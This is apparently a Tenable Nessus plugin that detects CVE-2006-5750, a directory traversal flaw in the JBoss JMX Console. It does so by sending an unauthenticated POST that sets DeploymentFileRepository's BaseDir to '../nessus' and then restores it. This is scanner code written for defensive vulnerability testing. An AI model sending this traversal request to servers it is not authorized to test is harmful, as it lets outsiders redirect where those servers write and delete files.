#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(23843);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2006-5750");
  script_bugtraq_id(21219);
  script_xref(name:"OSVDB", value:"30767");

  script_name(english:"JBoss Application Server (jbossas) JMX Console DeploymentFileRepository Traversal Arbitrary File Manipulation");
  script_summary(english:"Tries to change the JMX Console DeploymentFileRepository's BaseDir");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Java service that is affected by a
directory traversal flaw." );
 script_set_attribute(attribute:"description", value:
"The remote web server appears to be a version of JBoss that fails to
sanitize user-supplied input to the BaseDir parameter used by the
'DeploymentFileRepository' service of JMX Console before using it to
store or delete files.  An unauthenticated attacker may be able to
exploit this to alter files on the remote host subject to the
privileges of the JBoss user." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/archive/1/452830/100/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://jira.jboss.com/jira/browse/JBAS-3861" );
 script_set_attribute(attribute:"see_also", value:"http://wiki.jboss.org/wiki/Wiki.jsp?page=SecureTheJmxConsole" );
 script_set_attribute(attribute:"solution", value:
"Secure access to the JMX Console as described in the Wiki article
referenced above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

port = get_http_port(default:8080);
if (!get_port_state(port)) exit(0);


# Figure out the current BaseDir.
req = http_get(
  item:string(
    "/jmx-console/HtmlAdaptor?",
    "action=inspectMBean&",
    "name=jboss.admin%3Aservice%3DDeploymentFileRepository"
  ), 
  port:port
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);

base = NULL;
pat = 'input type="text" name="BaseDir" value="([^"]+)"';
matches = egrep(pattern:pat, string:res);
if (matches)
{
  foreach match (split(matches)) 
  {
    match = chomp(match);
    ver = eregmatch(pattern:pat, string:match);
    if (!isnull(ver))
    {
      base = ver[1];
      break;
    }
  }
}
if (isnull(base)) exit(0);


# Try to change it.
new_base = "../nessus";
postdata = string(
  "action=updateAttributes&",
  "name=jboss.admin%3Aservice%3DDeploymentFileRepository&",
   "BaseDir=", urlencode(str:new_base)
);
req = string(
  "POST /jmx-console/HtmlAdaptor HTTP/1.1\r\n",
  "Host: ", get_host_name(), "\r\n",
  "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
  "Content-Type: application/x-www-form-urlencoded\r\n",
  "Content-Length: ", strlen(postdata), "\r\n",
  "\r\n",
  postdata
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
if (res == NULL) exit(0);


# If our change went through...
if (string('input type="text" name="BaseDir" value="', new_base, '"') >< res)
{
  # There's a problem.
  security_hole(port);

  # Be nice and change it back?
  if (1)
  {
    postdata = string(
      "action=updateAttributes&",
      "name=jboss.admin%3Aservice%3DDeploymentFileRepository&",
       "BaseDir=", urlencode(str:base)
    );
    req = string(
      "POST /jmx-console/HtmlAdaptor HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  }
}
